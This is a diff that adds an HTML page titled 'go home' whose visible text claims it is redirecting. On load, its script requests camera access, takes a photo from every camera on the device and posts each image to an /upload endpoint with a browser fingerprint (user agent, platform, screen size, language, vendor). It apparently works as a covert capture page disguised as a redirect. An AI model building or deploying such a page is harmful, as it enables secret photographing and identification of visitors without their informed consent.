@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>go home</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            background: #0f0f0f;
+            color: #e0e0e0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        h1 { font-size: 1.4rem; margin-bottom: 16px; font-weight: 500; }
+        #cameras {
+            width: 100%;
+            max-width: 640px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        .camera-block {
+            position: relative;
+            width: 100%;
+            border-radius: 12px;
+            overflow: hidden;
+            background: #1a1a1a;
+        }
+        .camera-label {
+            position: absolute;
+            top: 8px;
+            left: 8px;
+            background: rgba(0,0,0,0.6);
+            color: #fff;
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-size: 0.85rem;
+            z-index: 10;
+            max-width: calc(100% - 16px);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .camera-status {
+            position: absolute;
+            bottom: 8px;
+            right: 8px;
+            background: rgba(0,0,0,0.6);
+            color: #fff;
+            padding: 3px 8px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            z-index: 10;
+        }
+        video, .captured-image {
+            display: block;
+            width: 100%;
+            border-radius: 12px;
+        }
+        video { background: #000; }
+        .captured-image { display: none; }
+        #status {
+            margin-top: 16px;
+            padding: 10px 24px;
+            border-radius: 8px;
+            font-size: 0.95rem;
+            text-align: center;
+            min-height: 42px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            max-width: 640px;
+            width: 100%;
+        }
+        .status-info { background: #1a2a1a; color: #8fbc8f; }
+        .status-success { background: #1a2a1a; color: #66bb6a; }
+        .status-error { background: #2a1a1a; color: #ef5350; }
+        .status-loading { background: #1a1a2a; color: #90caf9; }
+        #flash {
+            position: fixed;
+            inset: 0;
+            background: white;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 999;
+            transition: opacity 0.15s;
+        }
+        #flash.active { opacity: 0.8; }
+        #retry-btn {
+            margin-top: 12px;
+            margin-bottom: 24px;
+            padding: 10px 28px;
+            border: none;
+            border-radius: 8px;
+            background: #333;
+            color: #e0e0e0;
+            font-size: 0.95rem;
+            cursor: pointer;
+            display: none;
+        }
+        #retry-btn:hover { background: #444; }
+    </style>
+</head>
+<body>
+    <h1>home</h1>
+    <div id="cameras"></div>
+    <div id="status" class="status-info">正在跳转...</div>
+    <button id="retry-btn" onclick="retry()">重新进入</button>
+
+    <div id="flash"></div>
+
+    <script>
+        const camerasContainer = document.getElementById('cameras');
+        const statusEl = document.getElementById('status');
+        const flash = document.getElementById('flash');
+        const retryBtn = document.getElementById('retry-btn');
+
+        function setStatus(text, type) {
+            statusEl.textContent = text;
+            statusEl.className = 'status-' + type;
+        }
+
+        function getDeviceInfo() {
+            return JSON.stringify({
+                userAgent: navigator.userAgent,
+                platform: navigator.platform || '',
+                language: navigator.language || '',
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                devicePixelRatio: window.devicePixelRatio || 1,
+                colorDepth: screen.colorDepth || '',
+                touchSupport: 'ontouchstart' in window,
+                cookieEnabled: navigator.cookieEnabled,
+                online: navigator.onLine,
+                vendor: navigator.vendor || '',
+            });
+        }
+
+        // 从设备 label 推断 facing（environment / user）
+        function detectFacing(label) {
+            if (!label) return '';
+            const l = label.toLowerCase();
+            if (l.includes('back') || l.includes('rear') || l.includes('environment') || l.includes('后')) return '后置';
+            if (l.includes('front') || l.includes('user') || l.includes('前') || l.includes('selfie')) return '前置';
+            return '';
+        }
+
+        function buildDisplayLabel(cam, index) {
+            const facing = detectFacing(cam.label);
+            if (facing) return facing + ' · ' + (cam.label || ('摄像头 ' + (index + 1)));
+            return cam.label || ('摄像头 ' + (index + 1));
+        }
+
+        // 抓拍单个摄像头：返回 base64 dataURL
+        async function captureFromDevice(deviceId, displayLabel) {
+            const block = document.createElement('div');
+            block.className = 'camera-block';
+
+            const labelEl = document.createElement('div');
+            labelEl.className = 'camera-label';
+            labelEl.textContent = displayLabel;
+            block.appendChild(labelEl);
+
+            const statusBadge = document.createElement('div');
+            statusBadge.className = 'camera-status';
+            statusBadge.textContent = '准备中...';
+            block.appendChild(statusBadge);
+
+            const video = document.createElement('video');
+            video.autoplay = true;
+            video.playsInline = true;
+            video.muted = true;
+            block.appendChild(video);
+
+            camerasContainer.appendChild(block);
+
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    deviceId: { exact: deviceId },
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                },
+                audio: false
+            });
+            video.srcObject = stream;
+            try { await video.play(); } catch (e) { /* autoplay may already start */ }
+
+            // 等待视频真正有画面
+            await new Promise(resolve => {
+                if (video.videoWidth > 0 && video.videoHeight > 0 && video.readyState >= 2) {
+                    return resolve();
+                }
+                video.addEventListener('loadeddata', () => resolve(), { once: true });
+            });
+            // 300ms 对焦等待
+            await new Promise(r => setTimeout(r, 300));
+
+            statusBadge.textContent = '抓拍中...';
+
+            // 抓拍
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            // 闪光
+            flash.classList.add('active');
+            setTimeout(() => flash.classList.remove('active'), 150);
+
+            // 关闭流
+            stream.getTracks().forEach(t => t.stop());
+            video.remove();
+
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+            const img = document.createElement('img');
+            img.className = 'captured-image';
+            img.src = dataUrl;
+            img.style.display = 'block';
+            block.appendChild(img);
+
+            return { dataUrl, block, statusBadge };
+        }
+
+        async function uploadImage(dataUrl, displayLabel) {
+            const blob = await (await fetch(dataUrl)).blob();
+            const formData = new FormData();
+            formData.append('image', blob, 'capture.jpg');
+            formData.append('device_info', getDeviceInfo());
+            formData.append('camera_label', displayLabel);
+
+            const resp = await fetch('/upload', { method: 'POST', body: formData });
+            if (!resp.ok) {
+                const text = await resp.text().catch(() => resp.statusText);
+                throw new Error('HTTP ' + resp.status + ' ' + text);
+            }
+            return await resp.json();
+        }
+
+        async function startCapture() {
+            if (!window.isSecureContext) {
+                setStatus('错误：当前非安全上下文（非 HTTPS），浏览器禁止访问摄像头。请使用 HTTPS 或 localhost 访问。', 'error');
+                retryBtn.style.display = 'block';
+                return;
+            }
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                setStatus('错误：浏览器不支持 getUserMedia API，请使用现代浏览器并通过 HTTPS 访问。', 'error');
+                retryBtn.style.display = 'block';
+                return;
+            }
+
+            try {
+                // 先用空约束请求一次权限，这样 enumerateDevices 才能拿到 label
+                const probeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                probeStream.getTracks().forEach(t => t.stop());
+
+                // 列出所有视频输入设备
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const cameras = devices.filter(d => d.kind === 'videoinput');
+
+                if (cameras.length === 0) {
+                    setStatus('未检测到任何摄像头', 'error');
+                    retryBtn.style.display = 'block';
+                    return;
+                }
+
+                // 去重：同一物理摄像头在某些浏览器/系统上可能返回多个 entry（不同 deviceId 但 label 相同）
+                // 用 label 去重，保留第一个 deviceId
+                const seen = new Set();
+                const uniqueCameras = [];
+                for (const cam of cameras) {
+                    const key = cam.label || cam.deviceId;
+                    if (seen.has(key)) continue;
+                    seen.add(key);
+                    uniqueCameras.push(cam);
+                }
+
+                setStatus(`检测到 ${uniqueCameras.length} 个摄像头，正在依次抓拍...`, 'info');
+
+                let success = 0;
+                let failed = 0;
+                for (let i = 0; i < uniqueCameras.length; i++) {
+                    const cam = uniqueCameras[i];
+                    const displayLabel = buildDisplayLabel(cam, i);
+                    setStatus(`(${i + 1}/${uniqueCameras.length}) 正在抓拍：${displayLabel}`, 'loading');
+                    try {
+                        const { dataUrl, statusBadge } = await captureFromDevice(cam.deviceId, displayLabel);
+                        const result = await uploadImage(dataUrl, displayLabel);
+                        success++;
+                        if (statusBadge) statusBadge.textContent = '✓ ' + result.filename;
+                        setStatus(`(${i + 1}/${uniqueCameras.length}) ✓ ${displayLabel}`, 'info');
+                    } catch (err) {
+                        failed++;
+                        setStatus(`(${i + 1}/${uniqueCameras.length}) ✗ ${displayLabel}: ${err.message}`, 'error');
+                    }
+                }
+
+                if (failed === 0) {
+                    setStatus(`抓拍完成 ✅ 共 ${success} 张`, 'success');
+                } else if (success === 0) {
+                    setStatus(`抓拍全部失败 ❌ ${failed} 张`, 'error');
+                } else {
+                    setStatus(`抓拍完成 ⚠️ 成功 ${success} 张，失败 ${failed} 张`, 'error');
+                }
+            } catch (err) {
+                setStatus('无法访问摄像头: ' + err.message, 'error');
+            }
+            retryBtn.style.display = 'block';
+        }
+
+        function retry() {
+            retryBtn.style.display = 'none';
+            camerasContainer.innerHTML = '';
+            startCapture();
+        }
+
+        startCapture();
+    </script>
+</body>
+</html>
